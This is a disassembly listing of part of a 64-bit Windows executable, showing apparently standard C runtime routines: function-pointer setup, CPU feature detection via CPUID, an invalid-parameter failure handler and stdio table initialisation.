   140003acc:	48 8d 15 25 dc 00 00 	lea    0xdc25(%rip),%rdx        # 0x1400116f8
   140003ad3:	48 33 05 26 55 01 00 	xor    0x15526(%rip),%rax        # 0x140019000
   140003ada:	48 8b cb             	mov    %rbx,%rcx
   140003add:	48 89 05 d4 91 01 00 	mov    %rax,0x191d4(%rip)        # 0x14001ccb8
   140003ae4:	ff 15 4e d5 00 00    	call   *0xd54e(%rip)        # 0x140011038
   140003aea:	48 8d 15 1f dc 00 00 	lea    0xdc1f(%rip),%rdx        # 0x140011710
   140003af1:	48 33 05 08 55 01 00 	xor    0x15508(%rip),%rax        # 0x140019000
   140003af8:	48 8b cb             	mov    %rbx,%rcx
   140003afb:	48 89 05 be 91 01 00 	mov    %rax,0x191be(%rip)        # 0x14001ccc0
   140003b02:	ff 15 30 d5 00 00    	call   *0xd530(%rip)        # 0x140011038
   140003b08:	48 8d 15 19 dc 00 00 	lea    0xdc19(%rip),%rdx        # 0x140011728
   140003b0f:	48 33 05 ea 54 01 00 	xor    0x154ea(%rip),%rax        # 0x140019000
   140003b16:	48 8b cb             	mov    %rbx,%rcx
   140003b19:	48 89 05 a8 91 01 00 	mov    %rax,0x191a8(%rip)        # 0x14001ccc8
   140003b20:	ff 15 12 d5 00 00    	call   *0xd512(%rip)        # 0x140011038
   140003b26:	48 8d 15 1b dc 00 00 	lea    0xdc1b(%rip),%rdx        # 0x140011748
   140003b2d:	48 33 05 cc 54 01 00 	xor    0x154cc(%rip),%rax        # 0x140019000
   140003b34:	48 8b cb             	mov    %rbx,%rcx
   140003b37:	48 89 05 92 91 01 00 	mov    %rax,0x19192(%rip)        # 0x14001ccd0
   140003b3e:	ff 15 f4 d4 00 00    	call   *0xd4f4(%rip)        # 0x140011038
   140003b44:	48 8d 15 15 dc 00 00 	lea    0xdc15(%rip),%rdx        # 0x140011760
   140003b4b:	48 33 05 ae 54 01 00 	xor    0x154ae(%rip),%rax        # 0x140019000
   140003b52:	48 8b cb             	mov    %rbx,%rcx
   140003b55:	48 89 05 7c 91 01 00 	mov    %rax,0x1917c(%rip)        # 0x14001ccd8
   140003b5c:	ff 15 d6 d4 00 00    	call   *0xd4d6(%rip)        # 0x140011038
   140003b62:	48 8d 15 0f dc 00 00 	lea    0xdc0f(%rip),%rdx        # 0x140011778
   140003b69:	48 33 05 90 54 01 00 	xor    0x15490(%rip),%rax        # 0x140019000
   140003b70:	48 8b cb             	mov    %rbx,%rcx
   140003b73:	48 89 05 66 91 01 00 	mov    %rax,0x19166(%rip)        # 0x14001cce0
   140003b7a:	ff 15 b8 d4 00 00    	call   *0xd4b8(%rip)        # 0x140011038
   140003b80:	48 8d 15 09 dc 00 00 	lea    0xdc09(%rip),%rdx        # 0x140011790
   140003b87:	48 33 05 72 54 01 00 	xor    0x15472(%rip),%rax        # 0x140019000
   140003b8e:	48 8b cb             	mov    %rbx,%rcx
   140003b91:	48 89 05 50 91 01 00 	mov    %rax,0x19150(%rip)        # 0x14001cce8
   140003b98:	ff 15 9a d4 00 00    	call   *0xd49a(%rip)        # 0x140011038
   140003b9e:	48 8d 15 03 dc 00 00 	lea    0xdc03(%rip),%rdx        # 0x1400117a8
   140003ba5:	48 33 05 54 54 01 00 	xor    0x15454(%rip),%rax        # 0x140019000
   140003bac:	48 8b cb             	mov    %rbx,%rcx
   140003baf:	48 89 05 3a 91 01 00 	mov    %rax,0x1913a(%rip)        # 0x14001ccf0
   140003bb6:	ff 15 7c d4 00 00    	call   *0xd47c(%rip)        # 0x140011038
   140003bbc:	48 33 05 3d 54 01 00 	xor    0x1543d(%rip),%rax        # 0x140019000
   140003bc3:	48 8d 15 fe db 00 00 	lea    0xdbfe(%rip),%rdx        # 0x1400117c8
   140003bca:	48 8b cb             	mov    %rbx,%rcx
   140003bcd:	48 89 05 24 91 01 00 	mov    %rax,0x19124(%rip)        # 0x14001ccf8
   140003bd4:	ff 15 5e d4 00 00    	call   *0xd45e(%rip)        # 0x140011038
   140003bda:	48 8d 15 07 dc 00 00 	lea    0xdc07(%rip),%rdx        # 0x1400117e8
   140003be1:	48 33 05 18 54 01 00 	xor    0x15418(%rip),%rax        # 0x140019000
   140003be8:	48 8b cb             	mov    %rbx,%rcx
   140003beb:	48 89 05 0e 91 01 00 	mov    %rax,0x1910e(%rip)        # 0x14001cd00
   140003bf2:	ff 15 40 d4 00 00    	call   *0xd440(%rip)        # 0x140011038
   140003bf8:	48 8d 15 09 dc 00 00 	lea    0xdc09(%rip),%rdx        # 0x140011808
   140003bff:	48 33 05 fa 53 01 00 	xor    0x153fa(%rip),%rax        # 0x140019000
   140003c06:	48 8b cb             	mov    %rbx,%rcx
   140003c09:	48 89 05 f8 90 01 00 	mov    %rax,0x190f8(%rip)        # 0x14001cd08
   140003c10:	ff 15 22 d4 00 00    	call   *0xd422(%rip)        # 0x140011038
   140003c16:	48 8d 15 0b dc 00 00 	lea    0xdc0b(%rip),%rdx        # 0x140011828
   140003c1d:	48 33 05 dc 53 01 00 	xor    0x153dc(%rip),%rax        # 0x140019000
   140003c24:	48 8b cb             	mov    %rbx,%rcx
   140003c27:	48 89 05 e2 90 01 00 	mov    %rax,0x190e2(%rip)        # 0x14001cd10
   140003c2e:	ff 15 04 d4 00 00    	call   *0xd404(%rip)        # 0x140011038
   140003c34:	48 8d 15 05 dc 00 00 	lea    0xdc05(%rip),%rdx        # 0x140011840
   140003c3b:	48 33 05 be 53 01 00 	xor    0x153be(%rip),%rax        # 0x140019000
   140003c42:	48 8b cb             	mov    %rbx,%rcx
   140003c45:	48 89 05 cc 90 01 00 	mov    %rax,0x190cc(%rip)        # 0x14001cd18
   140003c4c:	ff 15 e6 d3 00 00    	call   *0xd3e6(%rip)        # 0x140011038
   140003c52:	48 8d 15 07 dc 00 00 	lea    0xdc07(%rip),%rdx        # 0x140011860
   140003c59:	48 33 05 a0 53 01 00 	xor    0x153a0(%rip),%rax        # 0x140019000
   140003c60:	48 8b cb             	mov    %rbx,%rcx
   140003c63:	48 89 05 b6 90 01 00 	mov    %rax,0x190b6(%rip)        # 0x14001cd20
   140003c6a:	ff 15 c8 d3 00 00    	call   *0xd3c8(%rip)        # 0x140011038
   140003c70:	48 8d 15 01 dc 00 00 	lea    0xdc01(%rip),%rdx        # 0x140011878
   140003c77:	48 33 05 82 53 01 00 	xor    0x15382(%rip),%rax        # 0x140019000
   140003c7e:	48 8b cb             	mov    %rbx,%rcx
   140003c81:	48 89 05 a8 90 01 00 	mov    %rax,0x190a8(%rip)        # 0x14001cd30
   140003c88:	ff 15 aa d3 00 00    	call   *0xd3aa(%rip)        # 0x140011038
   140003c8e:	48 8d 15 f3 db 00 00 	lea    0xdbf3(%rip),%rdx        # 0x140011888
   140003c95:	48 33 05 64 53 01 00 	xor    0x15364(%rip),%rax        # 0x140019000
   140003c9c:	48 8b cb             	mov    %rbx,%rcx
   140003c9f:	48 89 05 82 90 01 00 	mov    %rax,0x19082(%rip)        # 0x14001cd28
   140003ca6:	ff 15 8c d3 00 00    	call   *0xd38c(%rip)        # 0x140011038
   140003cac:	48 8d 15 e5 db 00 00 	lea    0xdbe5(%rip),%rdx        # 0x140011898
   140003cb3:	48 33 05 46 53 01 00 	xor    0x15346(%rip),%rax        # 0x140019000
   140003cba:	48 8b cb             	mov    %rbx,%rcx
   140003cbd:	48 89 05 74 90 01 00 	mov    %rax,0x19074(%rip)        # 0x14001cd38
   140003cc4:	ff 15 6e d3 00 00    	call   *0xd36e(%rip)        # 0x140011038
   140003cca:	48 8d 15 d7 db 00 00 	lea    0xdbd7(%rip),%rdx        # 0x1400118a8
   140003cd1:	48 33 05 28 53 01 00 	xor    0x15328(%rip),%rax        # 0x140019000
   140003cd8:	48 8b cb             	mov    %rbx,%rcx
   140003cdb:	48 89 05 5e 90 01 00 	mov    %rax,0x1905e(%rip)        # 0x14001cd40
   140003ce2:	ff 15 50 d3 00 00    	call   *0xd350(%rip)        # 0x140011038
   140003ce8:	48 8d 15 c9 db 00 00 	lea    0xdbc9(%rip),%rdx        # 0x1400118b8
   140003cef:	48 33 05 0a 53 01 00 	xor    0x1530a(%rip),%rax        # 0x140019000
   140003cf6:	48 8b cb             	mov    %rbx,%rcx
   140003cf9:	48 89 05 48 90 01 00 	mov    %rax,0x19048(%rip)        # 0x14001cd48
   140003d00:	ff 15 32 d3 00 00    	call   *0xd332(%rip)        # 0x140011038
   140003d06:	48 8d 15 cb db 00 00 	lea    0xdbcb(%rip),%rdx        # 0x1400118d8
   140003d0d:	48 33 05 ec 52 01 00 	xor    0x152ec(%rip),%rax        # 0x140019000
   140003d14:	48 8b cb             	mov    %rbx,%rcx
   140003d17:	48 89 05 32 90 01 00 	mov    %rax,0x19032(%rip)        # 0x14001cd50
   140003d1e:	ff 15 14 d3 00 00    	call   *0xd314(%rip)        # 0x140011038
   140003d24:	48 8d 15 c5 db 00 00 	lea    0xdbc5(%rip),%rdx        # 0x1400118f0
   140003d2b:	48 33 05 ce 52 01 00 	xor    0x152ce(%rip),%rax        # 0x140019000
   140003d32:	48 8b cb             	mov    %rbx,%rcx
   140003d35:	48 89 05 1c 90 01 00 	mov    %rax,0x1901c(%rip)        # 0x14001cd58
   140003d3c:	ff 15 f6 d2 00 00    	call   *0xd2f6(%rip)        # 0x140011038
   140003d42:	48 8d 15 b7 db 00 00 	lea    0xdbb7(%rip),%rdx        # 0x140011900
   140003d49:	48 33 05 b0 52 01 00 	xor    0x152b0(%rip),%rax        # 0x140019000
   140003d50:	48 8b cb             	mov    %rbx,%rcx
   140003d53:	48 89 05 06 90 01 00 	mov    %rax,0x19006(%rip)        # 0x14001cd60
   140003d5a:	ff 15 d8 d2 00 00    	call   *0xd2d8(%rip)        # 0x140011038
   140003d60:	48 8d 15 b1 db 00 00 	lea    0xdbb1(%rip),%rdx        # 0x140011918
   140003d67:	48 33 05 92 52 01 00 	xor    0x15292(%rip),%rax        # 0x140019000
   140003d6e:	48 8b cb             	mov    %rbx,%rcx
   140003d71:	48 89 05 f0 8f 01 00 	mov    %rax,0x18ff0(%rip)        # 0x14001cd68
   140003d78:	ff 15 ba d2 00 00    	call   *0xd2ba(%rip)        # 0x140011038
   140003d7e:	48 8d 15 a3 db 00 00 	lea    0xdba3(%rip),%rdx        # 0x140011928
   140003d85:	48 33 05 74 52 01 00 	xor    0x15274(%rip),%rax        # 0x140019000
   140003d8c:	48 8b cb             	mov    %rbx,%rcx
   140003d8f:	48 89 05 da 8f 01 00 	mov    %rax,0x18fda(%rip)        # 0x14001cd70
   140003d96:	ff 15 9c d2 00 00    	call   *0xd29c(%rip)        # 0x140011038
   140003d9c:	48 33 05 5d 52 01 00 	xor    0x1525d(%rip),%rax        # 0x140019000
   140003da3:	48 8d 15 9e db 00 00 	lea    0xdb9e(%rip),%rdx        # 0x140011948
   140003daa:	48 8b cb             	mov    %rbx,%rcx
   140003dad:	48 89 05 c4 8f 01 00 	mov    %rax,0x18fc4(%rip)        # 0x14001cd78
   140003db4:	ff 15 7e d2 00 00    	call   *0xd27e(%rip)        # 0x140011038
   140003dba:	48 33 05 3f 52 01 00 	xor    0x1523f(%rip),%rax        # 0x140019000
   140003dc1:	48 89 05 b8 8f 01 00 	mov    %rax,0x18fb8(%rip)        # 0x14001cd80
   140003dc8:	48 83 c4 20          	add    $0x20,%rsp
   140003dcc:	5b                   	pop    %rbx
   140003dcd:	c3                   	ret
   140003dce:	cc                   	int3
   140003dcf:	cc                   	int3
   140003dd0:	48 ff 25 19 d3 00 00 	rex.W jmp *0xd319(%rip)        # 0x1400110f0
   140003dd7:	cc                   	int3
   140003dd8:	48 ff 25 41 d2 00 00 	rex.W jmp *0xd241(%rip)        # 0x140011020
   140003ddf:	cc                   	int3
   140003de0:	40 53                	rex push %rbx
   140003de2:	48 83 ec 20          	sub    $0x20,%rsp
   140003de6:	8b d9                	mov    %ecx,%ebx
   140003de8:	ff 15 1a d3 00 00    	call   *0xd31a(%rip)        # 0x140011108
   140003dee:	8b d3                	mov    %ebx,%edx
   140003df0:	48 8b c8             	mov    %rax,%rcx
   140003df3:	48 83 c4 20          	add    $0x20,%rsp
   140003df7:	5b                   	pop    %rbx
   140003df8:	48 ff 25 11 d3 00 00 	rex.W jmp *0xd311(%rip)        # 0x140011110
   140003dff:	cc                   	int3
   140003e00:	40 53                	rex push %rbx
   140003e02:	48 83 ec 20          	sub    $0x20,%rsp
   140003e06:	48 8b d9             	mov    %rcx,%rbx
   140003e09:	33 c9                	xor    %ecx,%ecx
   140003e0b:	ff 15 df d2 00 00    	call   *0xd2df(%rip)        # 0x1400110f0
   140003e11:	48 8b cb             	mov    %rbx,%rcx
   140003e14:	48 83 c4 20          	add    $0x20,%rsp
   140003e18:	5b                   	pop    %rbx
   140003e19:	48 ff 25 c8 d2 00 00 	rex.W jmp *0xd2c8(%rip)        # 0x1400110e8
   140003e20:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140003e25:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140003e2a:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140003e2f:	57                   	push   %rdi
   140003e30:	48 83 ec 10          	sub    $0x10,%rsp
   140003e34:	33 c9                	xor    %ecx,%ecx
   140003e36:	33 c0                	xor    %eax,%eax
   140003e38:	33 ff                	xor    %edi,%edi
   140003e3a:	0f a2                	cpuid
   140003e3c:	c7 05 d2 51 01 00 02 	movl   $0x2,0x151d2(%rip)        # 0x140019018
   140003e43:	00 00 00 
   140003e46:	c7 05 c4 51 01 00 01 	movl   $0x1,0x151c4(%rip)        # 0x140019014
   140003e4d:	00 00 00 
   140003e50:	44 8b db             	mov    %ebx,%r11d
   140003e53:	8b d9                	mov    %ecx,%ebx
   140003e55:	44 8b c2             	mov    %edx,%r8d
   140003e58:	81 f3 6e 74 65 6c    	xor    $0x6c65746e,%ebx
   140003e5e:	44 8b ca             	mov    %edx,%r9d
   140003e61:	41 8b d3             	mov    %r11d,%edx
   140003e64:	41 81 f0 69 6e 65 49 	xor    $0x49656e69,%r8d
   140003e6b:	81 f2 47 65 6e 75    	xor    $0x756e6547,%edx
   140003e71:	8b e8                	mov    %eax,%ebp
   140003e73:	44 0b c3             	or     %ebx,%r8d
   140003e76:	8d 47 01             	lea    0x1(%rdi),%eax
   140003e79:	44 0b c2             	or     %edx,%r8d
   140003e7c:	41 0f 94 c2          	sete   %r10b
   140003e80:	41 81 f3 41 75 74 68 	xor    $0x68747541,%r11d
   140003e87:	41 81 f1 65 6e 74 69 	xor    $0x69746e65,%r9d
   140003e8e:	45 0b d9             	or     %r9d,%r11d
   140003e91:	81 f1 63 41 4d 44    	xor    $0x444d4163,%ecx
   140003e97:	44 0b d9             	or     %ecx,%r11d
   140003e9a:	40 0f 94 c6          	sete   %sil
   140003e9e:	33 c9                	xor    %ecx,%ecx
   140003ea0:	0f a2                	cpuid
   140003ea2:	44 8b d9             	mov    %ecx,%r11d
   140003ea5:	44 8b c8             	mov    %eax,%r9d
   140003ea8:	89 5c 24 04          	mov    %ebx,0x4(%rsp)
   140003eac:	89 54 24 0c          	mov    %edx,0xc(%rsp)
   140003eb0:	45 84 d2             	test   %r10b,%r10b
   140003eb3:	74 4f                	je     0x140003f04
   140003eb5:	8b d0                	mov    %eax,%edx
   140003eb7:	81 e2 f0 3f ff 0f    	and    $0xfff3ff0,%edx
   140003ebd:	81 fa c0 06 01 00    	cmp    $0x106c0,%edx
   140003ec3:	74 2b                	je     0x140003ef0
   140003ec5:	81 fa 60 06 02 00    	cmp    $0x20660,%edx
   140003ecb:	74 23                	je     0x140003ef0
   140003ecd:	81 fa 70 06 02 00    	cmp    $0x20670,%edx
   140003ed3:	74 1b                	je     0x140003ef0
   140003ed5:	81 c2 b0 f9 fc ff    	add    $0xfffcf9b0,%edx
   140003edb:	83 fa 20             	cmp    $0x20,%edx
   140003ede:	77 24                	ja     0x140003f04
   140003ee0:	48 b9 01 00 01 00 01 	movabs $0x100010001,%rcx
   140003ee7:	00 00 00 
   140003eea:	48 0f a3 d1          	bt     %rdx,%rcx
   140003eee:	73 14                	jae    0x140003f04
   140003ef0:	44 8b 05 f1 6f 01 00 	mov    0x16ff1(%rip),%r8d        # 0x14001aee8
   140003ef7:	41 83 c8 01          	or     $0x1,%r8d
   140003efb:	44 89 05 e6 6f 01 00 	mov    %r8d,0x16fe6(%rip)        # 0x14001aee8
   140003f02:	eb 07                	jmp    0x140003f0b
   140003f04:	44 8b 05 dd 6f 01 00 	mov    0x16fdd(%rip),%r8d        # 0x14001aee8
   140003f0b:	40 84 f6             	test   %sil,%sil
   140003f0e:	74 1b                	je     0x140003f2b
   140003f10:	41 81 e1 00 0f f0 0f 	and    $0xff00f00,%r9d
   140003f17:	41 81 f9 00 0f 60 00 	cmp    $0x600f00,%r9d
   140003f1e:	7c 0b                	jl     0x140003f2b
   140003f20:	41 83 c8 04          	or     $0x4,%r8d
   140003f24:	44 89 05 bd 6f 01 00 	mov    %r8d,0x16fbd(%rip)        # 0x14001aee8
   140003f2b:	b8 07 00 00 00       	mov    $0x7,%eax
   140003f30:	3b e8                	cmp    %eax,%ebp
   140003f32:	7c 22                	jl     0x140003f56
   140003f34:	33 c9                	xor    %ecx,%ecx
   140003f36:	0f a2                	cpuid
   140003f38:	8b fb                	mov    %ebx,%edi
   140003f3a:	89 04 24             	mov    %eax,(%rsp)
   140003f3d:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   140003f41:	89 54 24 0c          	mov    %edx,0xc(%rsp)
   140003f45:	0f ba e3 09          	bt     $0x9,%ebx
   140003f49:	73 0b                	jae    0x140003f56
   140003f4b:	41 83 c8 02          	or     $0x2,%r8d
   140003f4f:	44 89 05 92 6f 01 00 	mov    %r8d,0x16f92(%rip)        # 0x14001aee8
   140003f56:	41 0f ba e3 14       	bt     $0x14,%r11d
   140003f5b:	73 50                	jae    0x140003fad
   140003f5d:	c7 05 ad 50 01 00 02 	movl   $0x2,0x150ad(%rip)        # 0x140019014
   140003f64:	00 00 00 
   140003f67:	c7 05 a7 50 01 00 06 	movl   $0x6,0x150a7(%rip)        # 0x140019018
   140003f6e:	00 00 00 
   140003f71:	41 0f ba e3 1b       	bt     $0x1b,%r11d
   140003f76:	73 35                	jae    0x140003fad
   140003f78:	41 0f ba e3 1c       	bt     $0x1c,%r11d
   140003f7d:	73 2e                	jae    0x140003fad
   140003f7f:	c7 05 8b 50 01 00 03 	movl   $0x3,0x1508b(%rip)        # 0x140019014
   140003f86:	00 00 00 
   140003f89:	c7 05 85 50 01 00 0e 	movl   $0xe,0x15085(%rip)        # 0x140019018
   140003f90:	00 00 00 
   140003f93:	40 f6 c7 20          	test   $0x20,%dil
   140003f97:	74 14                	je     0x140003fad
   140003f99:	c7 05 71 50 01 00 05 	movl   $0x5,0x15071(%rip)        # 0x140019014
   140003fa0:	00 00 00 
   140003fa3:	c7 05 6b 50 01 00 2e 	movl   $0x2e,0x1506b(%rip)        # 0x140019018
   140003faa:	00 00 00 
   140003fad:	48 8b 5c 24 20       	mov    0x20(%rsp),%rbx
   140003fb2:	48 8b 6c 24 28       	mov    0x28(%rsp),%rbp
   140003fb7:	48 8b 74 24 30       	mov    0x30(%rsp),%rsi
   140003fbc:	33 c0                	xor    %eax,%eax
   140003fbe:	48 83 c4 10          	add    $0x10,%rsp
   140003fc2:	5f                   	pop    %rdi
   140003fc3:	c3                   	ret
   140003fc4:	48 8b c4             	mov    %rsp,%rax
   140003fc7:	48 89 58 10          	mov    %rbx,0x10(%rax)
   140003fcb:	48 89 70 18          	mov    %rsi,0x18(%rax)
   140003fcf:	48 89 78 20          	mov    %rdi,0x20(%rax)
   140003fd3:	55                   	push   %rbp
   140003fd4:	48 8d a8 48 fb ff ff 	lea    -0x4b8(%rax),%rbp
   140003fdb:	48 81 ec b0 05 00 00 	sub    $0x5b0,%rsp
   140003fe2:	48 8b 05 17 50 01 00 	mov    0x15017(%rip),%rax        # 0x140019000
   140003fe9:	48 33 c4             	xor    %rsp,%rax
   140003fec:	48 89 85 a0 04 00 00 	mov    %rax,0x4a0(%rbp)
   140003ff3:	41 8b f8             	mov    %r8d,%edi
   140003ff6:	8b f2                	mov    %edx,%esi
   140003ff8:	8b d9                	mov    %ecx,%ebx
   140003ffa:	83 f9 ff             	cmp    $0xffffffff,%ecx
   140003ffd:	74 05                	je     0x140004004
   140003fff:	e8 d0 f7 ff ff       	call   0x1400037d4
   140004004:	83 64 24 30 00       	andl   $0x0,0x30(%rsp)
   140004009:	48 8d 4c 24 34       	lea    0x34(%rsp),%rcx
   14000400e:	33 d2                	xor    %edx,%edx
   140004010:	41 b8 94 00 00 00    	mov    $0x94,%r8d
   140004016:	e8 85 e7 ff ff       	call   0x1400027a0
   14000401b:	48 8d 44 24 30       	lea    0x30(%rsp),%rax
   140004020:	48 8d 4d d0          	lea    -0x30(%rbp),%rcx
   140004024:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140004029:	48 8d 45 d0          	lea    -0x30(%rbp),%rax
   14000402d:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140004032:	e8 a5 f7 ff ff       	call   0x1400037dc
   140004037:	48 8b 85 b8 04 00 00 	mov    0x4b8(%rbp),%rax
   14000403e:	48 89 85 c8 00 00 00 	mov    %rax,0xc8(%rbp)
   140004045:	48 8d 85 b8 04 00 00 	lea    0x4b8(%rbp),%rax
   14000404c:	89 74 24 30          	mov    %esi,0x30(%rsp)
   140004050:	48 83 c0 08          	add    $0x8,%rax
   140004054:	89 7c 24 34          	mov    %edi,0x34(%rsp)
   140004058:	48 89 45 68          	mov    %rax,0x68(%rbp)
   14000405c:	48 8b 85 b8 04 00 00 	mov    0x4b8(%rbp),%rax
   140004063:	48 89 44 24 40       	mov    %rax,0x40(%rsp)
   140004068:	ff 15 02 d0 00 00    	call   *0xd002(%rip)        # 0x140011070
   14000406e:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140004073:	8b f8                	mov    %eax,%edi
   140004075:	e8 86 fd ff ff       	call   0x140003e00
   14000407a:	85 c0                	test   %eax,%eax
   14000407c:	75 10                	jne    0x14000408e
   14000407e:	85 ff                	test   %edi,%edi
   140004080:	75 0c                	jne    0x14000408e
   140004082:	83 fb ff             	cmp    $0xffffffff,%ebx
   140004085:	74 07                	je     0x14000408e
   140004087:	8b cb                	mov    %ebx,%ecx
   140004089:	e8 46 f7 ff ff       	call   0x1400037d4
   14000408e:	48 8b 8d a0 04 00 00 	mov    0x4a0(%rbp),%rcx
   140004095:	48 33 cc             	xor    %rsp,%rcx
   140004098:	e8 a3 f1 ff ff       	call   0x140003240
   14000409d:	4c 8d 9c 24 b0 05 00 	lea    0x5b0(%rsp),%r11
   1400040a4:	00 
   1400040a5:	49 8b 5b 18          	mov    0x18(%r11),%rbx
   1400040a9:	49 8b 73 20          	mov    0x20(%r11),%rsi
   1400040ad:	49 8b 7b 28          	mov    0x28(%r11),%rdi
   1400040b1:	49 8b e3             	mov    %r11,%rsp
   1400040b4:	5d                   	pop    %rbp
   1400040b5:	c3                   	ret
   1400040b6:	cc                   	int3
   1400040b7:	cc                   	int3
   1400040b8:	48 89 0d 31 6e 01 00 	mov    %rcx,0x16e31(%rip)        # 0x14001aef0
   1400040bf:	c3                   	ret
   1400040c0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400040c5:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   1400040ca:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   1400040cf:	57                   	push   %rdi
   1400040d0:	48 83 ec 30          	sub    $0x30,%rsp
   1400040d4:	48 8b e9             	mov    %rcx,%rbp
   1400040d7:	48 8b 0d 12 6e 01 00 	mov    0x16e12(%rip),%rcx        # 0x14001aef0
   1400040de:	41 8b d9             	mov    %r9d,%ebx
   1400040e1:	49 8b f8             	mov    %r8,%rdi
   1400040e4:	48 8b f2             	mov    %rdx,%rsi
   1400040e7:	ff 15 9b cf 00 00    	call   *0xcf9b(%rip)        # 0x140011088
   1400040ed:	44 8b cb             	mov    %ebx,%r9d
   1400040f0:	4c 8b c7             	mov    %rdi,%r8
   1400040f3:	48 8b d6             	mov    %rsi,%rdx
   1400040f6:	48 8b cd             	mov    %rbp,%rcx
   1400040f9:	48 85 c0             	test   %rax,%rax
   1400040fc:	74 17                	je     0x140004115
   1400040fe:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   140004103:	48 8b 6c 24 48       	mov    0x48(%rsp),%rbp
   140004108:	48 8b 74 24 50       	mov    0x50(%rsp),%rsi
   14000410d:	48 83 c4 30          	add    $0x30,%rsp
   140004111:	5f                   	pop    %rdi
   140004112:	48 ff e0             	rex.W jmp *%rax
   140004115:	48 8b 44 24 60       	mov    0x60(%rsp),%rax
   14000411a:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   14000411f:	e8 24 00 00 00       	call   0x140004148
   140004124:	cc                   	int3
   140004125:	cc                   	int3
   140004126:	cc                   	int3
   140004127:	cc                   	int3
   140004128:	48 83 ec 38          	sub    $0x38,%rsp
   14000412c:	48 83 64 24 20 00    	andq   $0x0,0x20(%rsp)
   140004132:	45 33 c9             	xor    %r9d,%r9d
   140004135:	45 33 c0             	xor    %r8d,%r8d
   140004138:	33 d2                	xor    %edx,%edx
   14000413a:	33 c9                	xor    %ecx,%ecx
   14000413c:	e8 7f ff ff ff       	call   0x1400040c0
   140004141:	48 83 c4 38          	add    $0x38,%rsp
   140004145:	c3                   	ret
   140004146:	cc                   	int3
   140004147:	cc                   	int3
   140004148:	48 83 ec 28          	sub    $0x28,%rsp
   14000414c:	b9 17 00 00 00       	mov    $0x17,%ecx
   140004151:	e8 76 c3 00 00       	call   0x1400104cc
   140004156:	85 c0                	test   %eax,%eax
   140004158:	74 07                	je     0x140004161
   14000415a:	b9 05 00 00 00       	mov    $0x5,%ecx
   14000415f:	cd 29                	int    $0x29
   140004161:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140004167:	ba 17 04 00 c0       	mov    $0xc0000417,%edx
   14000416c:	41 8d 48 01          	lea    0x1(%r8),%ecx
   140004170:	e8 4f fe ff ff       	call   0x140003fc4
   140004175:	b9 17 04 00 c0       	mov    $0xc0000417,%ecx
   14000417a:	48 83 c4 28          	add    $0x28,%rsp
   14000417e:	e9 5d fc ff ff       	jmp    0x140003de0
   140004183:	cc                   	int3
   140004184:	48 83 ec 28          	sub    $0x28,%rsp
   140004188:	48 85 c9             	test   %rcx,%rcx
   14000418b:	75 15                	jne    0x1400041a2
   14000418d:	e8 e6 03 00 00       	call   0x140004578
   140004192:	c7 00 16 00 00 00    	movl   $0x16,(%rax)
   140004198:	e8 8b ff ff ff       	call   0x140004128
   14000419d:	83 c8 ff             	or     $0xffffffff,%eax
   1400041a0:	eb 03                	jmp    0x1400041a5
   1400041a2:	8b 41 1c             	mov    0x1c(%rcx),%eax
   1400041a5:	48 83 c4 28          	add    $0x28,%rsp
   1400041a9:	c3                   	ret
   1400041aa:	cc                   	int3
   1400041ab:	cc                   	int3
   1400041ac:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400041b1:	57                   	push   %rdi
   1400041b2:	48 83 ec 20          	sub    $0x20,%rsp
   1400041b6:	8b 05 bc 7a 01 00    	mov    0x17abc(%rip),%eax        # 0x14001bc78
   1400041bc:	33 db                	xor    %ebx,%ebx
   1400041be:	bf 14 00 00 00       	mov    $0x14,%edi
   1400041c3:	85 c0                	test   %eax,%eax
   1400041c5:	75 07                	jne    0x1400041ce
   1400041c7:	b8 00 02 00 00       	mov    $0x200,%eax
   1400041cc:	eb 05                	jmp    0x1400041d3
   1400041ce:	3b c7                	cmp    %edi,%eax
   1400041d0:	0f 4c c7             	cmovl  %edi,%eax
   1400041d3:	48 63 c8             	movslq %eax,%rcx
   1400041d6:	ba 08 00 00 00       	mov    $0x8,%edx
   1400041db:	89 05 97 7a 01 00    	mov    %eax,0x17a97(%rip)        # 0x14001bc78
   1400041e1:	e8 ce 30 00 00       	call   0x1400072b4
   1400041e6:	48 89 05 83 7a 01 00 	mov    %rax,0x17a83(%rip)        # 0x14001bc70
   1400041ed:	48 85 c0             	test   %rax,%rax
   1400041f0:	75 24                	jne    0x140004216
   1400041f2:	8d 50 08             	lea    0x8(%rax),%edx
   1400041f5:	48 8b cf             	mov    %rdi,%rcx
   1400041f8:	89 3d 7a 7a 01 00    	mov    %edi,0x17a7a(%rip)        # 0x14001bc78
   1400041fe:	e8 b1 30 00 00       	call   0x1400072b4
   140004203:	48 89 05 66 7a 01 00 	mov    %rax,0x17a66(%rip)        # 0x14001bc70
   14000420a:	48 85 c0             	test   %rax,%rax
   14000420d:	75 07                	jne    0x140004216
   14000420f:	b8 1a 00 00 00       	mov    $0x1a,%eax
   140004214:	eb 23                	jmp    0x140004239
   140004216:	48 8d 0d 03 4e 01 00 	lea    0x14e03(%rip),%rcx        # 0x140019020
   14000421d:	48 89 0c 03          	mov    %rcx,(%rbx,%rax,1)
   140004221:	48 83 c1 30          	add    $0x30,%rcx
   140004225:	48 8d 5b 08          	lea    0x8(%rbx),%rbx
   140004229:	48 ff cf             	dec    %rdi
   14000422c:	74 09                	je     0x140004237
   14000422e:	48 8b 05 3b 7a 01 00 	mov    0x17a3b(%rip),%rax        # 0x14001bc70
   140004235:	eb e6                	jmp    0x14000421d
   140004237:	33 c0                	xor    %eax,%eax
   140004239:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000423e:	48 83 c4 20          	add    $0x20,%rsp
   140004242:	5f                   	pop    %rdi
   140004243:	c3                   	ret
   140004244:	48 83 ec 28          	sub    $0x28,%rsp
   140004248:	e8 9b 04 00 00       	call   0x1400046e8
